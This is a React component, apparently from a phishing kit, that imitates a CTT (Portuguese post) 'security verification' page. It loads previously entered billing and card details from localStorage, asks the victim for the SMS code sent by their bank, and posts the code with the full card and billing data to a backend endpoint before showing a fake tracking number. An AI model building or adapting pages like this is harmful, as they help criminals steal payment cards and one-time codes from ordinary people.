import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent } from './ui/card';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Shield, RefreshCw } from 'lucide-react';
import axios from 'axios';

// Get API URL from environment
const API = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';

const CTTOTPForm = () => {
  const navigate = useNavigate();
  const [billingData, setBillingData] = useState(null);
  const [cardData, setCardData] = useState(null);
  const [otpCode, setOtpCode] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isResending, setIsResending] = useState(false);

  useEffect(() => {
    // Get billing and card data from localStorage
    const storedBillingData = localStorage.getItem('ctt_billing_data');
    const storedCardData = localStorage.getItem('ctt_card_data');
    
    if (storedBillingData && storedCardData) {
      setBillingData(JSON.parse(storedBillingData));
      setCardData(JSON.parse(storedCardData));
    } else {
      // If no data, redirect to billing page
      navigate('/billing');
    }
  }, [navigate]);

  const formatPhoneNumber = (phone) => {
    if (!phone) return '';
    // Remove +351 and show only last 3 digits
    const cleaned = phone.replace('+351', '').trim();
    if (cleaned.length >= 3) {
      return '•••••' + cleaned.slice(-3);
    }
    return phone;
  };

  const handleOtpChange = (e) => {
    const value = e.target.value;
    setOtpCode(value);
  };

  const handleResendOTP = async () => {
    if (!billingData) return;
    
    setIsResending(true);
    
    try {
      const resendRequest = {
        phone: billingData.telefone,
        billing_data: billingData
      };
      
      const response = await axios.post(`${API}/api/ctt/otp/resend`, resendRequest);
      
      if (response.data.status === 'success') {
        // No toast notification
      }
      
    } catch (error) {
      console.error('Error resending OTP:', error);
    } finally {
      setIsResending(false);
    }
  };

  const handleSubmit = async () => {
    if (!otpCode.trim() || !billingData || !cardData) {
      return;
    }

    setIsSubmitting(true);

    try {
      const otpRequest = {
        otp_code: otpCode,
        billing_data: billingData,
        card_data: cardData
      };

      const response = await axios.post(`${API}/api/ctt/otp/verify`, otpRequest);
      
      if (response.data.status === 'success') {
        // Store verification status
        localStorage.setItem('ctt_otp_verified', 'true');
        localStorage.setItem('ctt_tracking_number', response.data.tracking_number);
        
        // Navigate to confirmation page
        navigate('/confirmation');
      }
      
    } catch (error) {
      console.error('Error verifying OTP:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (!billingData || !cardData) {
    return <div>Carregando...</div>;
  }

  const phoneNumber = formatPhoneNumber(billingData.telefone);

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
        <CardContent className="p-8">
          {/* Form Header */}
          <div className="flex items-center mb-8">
            <Shield className="w-5 h-5 text-red-600 mr-3" />
            <h2 className="text-xl font-semibold text-gray-900">
              Verificação de Segurança
            </h2>
          </div>

          {/* Info Card */}
          <div className="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
            <div className="flex">
              <div className="flex-shrink-0">
                <Shield className="h-5 w-5 text-blue-400" />
              </div>
              <div className="ml-3">
                <p className="text-sm text-blue-700">
                  <strong>Código de verificação enviado!</strong><br />
                  Foi enviado um código de 6 dígitos via SMS para o seu número de telemóvel.
                </p>
              </div>
            </div>
          </div>

          {/* Customer Info */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <h3 className="font-semibold text-gray-900 mb-2">Dados da verificação:</h3>
            <p className="text-sm text-gray-700">
              <strong>{billingData.nome}</strong>
            </p>
            <p className="text-sm text-gray-600">
              SMS enviado para: {phoneNumber}
            </p>
          </div>

          {/* OTP Input */}
          <div className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="otp" className="text-sm font-medium text-gray-700">
                Código de verificação <span className="text-red-500">*</span>
              </Label>
              <Input
                id="otp"
                name="otp"
                type="text"
                value={otpCode}
                onChange={handleOtpChange}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500 text-center tracking-widest"
                placeholder="Insira o código recebido por SMS"
                maxLength={50}
              />
            </div>

            {/* Resend Button */}
            <div className="text-center">
              <Button
                onClick={handleResendOTP}
                disabled={isResending}
                variant="ghost"
                className="text-red-600 hover:text-red-700 text-sm"
              >
                {isResending ? (
                  <div className="flex items-center">
                    <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                    Reenviando...
                  </div>
                ) : (
                  'Reenviar código SMS'
                )}
              </Button>
            </div>
          </div>

          {/* Submit Button */}
          <div className="mt-8 flex justify-end">
            <Button
              onClick={handleSubmit}
              disabled={isSubmitting || !otpCode.trim()}
              className={`px-8 py-2 rounded-md font-medium transition-colors duration-200 ${
                isSubmitting || !otpCode.trim()
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-red-600 hover:bg-red-700 text-white'
              }`}
            >
              {isSubmitting ? (
                <div className="flex items-center">
                  <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Verificando...
                </div>
              ) : (
                'Enviar Código'
              )}
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default CTTOTPForm;